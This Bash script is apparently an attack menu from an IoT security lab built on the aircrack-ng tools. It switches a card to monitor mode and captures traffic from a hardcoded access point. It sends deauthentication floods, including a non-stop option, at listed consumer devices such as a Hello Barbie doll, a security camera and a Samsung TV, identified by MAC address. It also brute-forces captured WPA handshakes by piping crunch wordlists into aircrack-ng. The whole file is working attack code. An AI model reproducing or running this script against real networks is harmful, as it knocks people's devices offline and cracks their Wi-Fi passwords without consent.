#! /bin/bash



function Monitor(){
	var=$(iwconfig wlan1mon | grep wlan1mon)
	str="No such device"
	if [[ "$str" == *"$var"*  ]];
	then
		airmon-ng start wlan1
		echo 'Turn on the monitor mode on wlan1'
		if [[ $1  -eq 0 ]]
		then
			return 0
		fi
	elif [[  "$str" != *"$var"* && $1 -eq 0 ]];
	then
		airmon-ng stop wlan1mon
		echo 'Turn off the monitor mode on wlan1mon'
		return 0
	fi
	
	echo 'Do you wanna record the monitor result?'
	echo 'y/n'
	read RECORD

	case $RECORD in
		[Yy]) echo 'Type your file name, you can find the file in monitoring folder'
			    read FILENAME
			    mkdir ../monitoring/$FILENAME
			    airodump-ng --channel 6 -w ../monitoring/$FILENAME/$FILENAME --bssid 4C:32:75:C4:A4:8E wlan1mon
			    ;;
		[Nn]) airodump-ng --channel 6 --bssid 4C:32:75:C4:A4:8E wlan1mon
			;;
		*)    echo 'Cannot understand your request......program stop';;
	esac

}

function FindTarget(){
	echo 'Here is the list of known devices, please choose the target.'
	echo '1. Hello Barbie'
	echo '2. TRENDnet Secure Cam'
	echo '3. Canary Home'
	echo '4. ZTE android phone'
	echo '5. Samsung TV'
	echo '6. Wemo Switch'
	echo '7. Amazon Device1'
	echo '8. Amaozn Device2'
	echo '9. My iphone'
	read TARGET

	if [[ $Option -eq 2  ]];
	then
		echo 'Select Packets number->must be in integer (Type 0 for non-stop attack)'
       		read NumOfPac
	fi

	local num=$1
	eval $num=$NumOfPac
	local myresult=$2

	case $TARGET in
		1) eval $myresult="80:A5:89:10:33:42";;
		2) eval $myresult="D8:EB:97:D7:D4:6E";;
		3) eval $myresult="D8:42:E2:01:7B:04";;
		4) eval $myresult="D8:55:A3:CB:2D:6E";;	
		5) eval $myresult="FC:F1:36:76:35:41";;
		6) eval $myresult="60:38:E0:5F:1B:69";;
		7) eval $myresult="0C:47:C9:13:E5:80";;
		8) eval $myresult="34:D2:70:65:07:3F";;	
		9) eval $myresult="4C:57:CA:36:35:E2";;
		*) echo 'Target Unknown';;

		#1) Deaut1 $NumOfPac "80:A5:89:10:33:42";;
		#2) Deaut1 $NumOfPac "D8:EB:97:D7:D4:6E";;
		#3) Deaut1 $NumOfPac "D8:42:E2:01:7B:04";;
		#4) Deaut1 $NumOfPac "D8:55:A3:CB:2D:6E";;	
		#5) Deaut1 $NumOfPac "FC:F1:36:76:35:41";;
		#6) Deaut1 $NumOfPac "60:38:E0:5F:1B:69";;
		#*) echo 'Target unknown';;
		
	esac	

}


function Deaut1(){
	aireplay-ng -0 $1 -a 4C:32:75:C4:A4:8E -c $2 --ignore-negative wlan1mon
}

function MITM() {
	airbase-ng -h $1 wlan1mon
}


function BF(){
	echo 'Before you start the attack, make sure you have captured the four way handshake. Do you finish the capturing? y/n'
	read CAP

	case $CAP in
		[yY]) echo 'Process running...'
		;;
		[nN]) echo 'Please record the data while monitoring and launch a deauf attack to capture the 4-way handshake'
		      return 0;;
		*)    echo 'Cannot understand your answer, program stop...'
		      return 0;;
	esac

	echo 'Please tell me your folder name of 4-way handshake'
	read FOLDER
	if [[ ! -d ../monitoring/"$FOLDER" ]]; 
	then
		echo 'Cannot find the directory, progrom stops...'
	        return 0	
	fi

	echo 'Choose minimun and maxmum length of passwords'
	read MIN
	read MAX

	if [[ MIN -gt MAX  ]];
	then echo 'Minimun length must be shorter than maxmum length'
	     return 0
        fi	     
	
	echo 'Type the password comlpexity. (E/D) E for ECEIoT, D for Define by yourself.'
	read COM
	COMX=''
	case $COM in
		[Ee]) 
			var="rozenbilt"
			COMX="$COMX$var"
			echo $COMX
		;;
	
		[Dd])
		       echo 'Define the complexity of password'
	       	       echo 'Are uppercase words included? y/n'
		       read UPP
		       case $UPP in
		       [Yy]) var="ABCDEFGHIJKLMNPQRSTUVWXYZ"
			       COMX="$COMX$var"
			       ;;
		       esac

		       echo 'Are lowercase words included? y/n'
		       read LOWER
		       case $LOWER in
		       [Yy]) var="abcdefghijklmnopqrstuvwxyz"
			       COMX="$COMX$var"
			       ;;
	       	       esac

		       echo 'Are numbers included? y/n'
		       read NUM
		       case $NUM in
		       [Yy]) var="1234567890"
			       COMX="$COMX$var"
			       ;;
	       	       esac
		       ;;
		*) echo 'Cannot understand your request, progrom stop...'
		   return 0
		;;
	esac

	FILE="-01.cap"
	FILE="$FOLDER$FILE"
	
	crunch $MIN $MAX $COMX | aircrack-ng -w - --bssid 4C:32:75:C4:A4:8E ../monitoring/"$FOLDER"/"$FILE"
}

echo 'There are some options that you can use for attacking, please tell me what do you want?'

echo '0. Turn On/ Off the monitor mode'
echo '1. Monitoring the network/devices in ECEIoT.'
echo '2. Deauthentication Attack.'
echo '3. Brute Force Attack'

read Option

case $Option in
	0)	Monitor $Option
		;;
	1)	Monitor	$Option;;
	2) 	FindTarget num1 target $Option
		Deaut1 $num1 $target
		;;
	3) 	BF
		;;
	*) echo 'yet finish the setting';;
		
esac







